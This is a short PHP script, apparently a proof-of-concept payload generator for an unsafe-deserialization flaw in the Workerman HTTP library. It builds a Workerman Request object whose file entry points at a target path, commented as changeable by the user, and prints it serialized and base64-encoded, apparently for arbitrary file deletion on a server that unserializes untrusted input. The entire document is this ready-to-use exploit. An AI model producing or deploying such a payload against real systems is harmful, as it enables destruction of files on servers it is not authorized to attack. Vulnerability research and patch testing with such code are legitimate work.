<?php
namespace Workerman\Protocols\Http{
    class Request
    {
    protected $_buffer = 'something';
    protected $_data = array("files"=>array("tmp_name"=>"/tmp/file_to_delete"));//the file to delete which can be customed by you
    }
}
namespace{
    
    echo base64_encode(serialize(new Workerman\Protocols\Http\Request()));
}
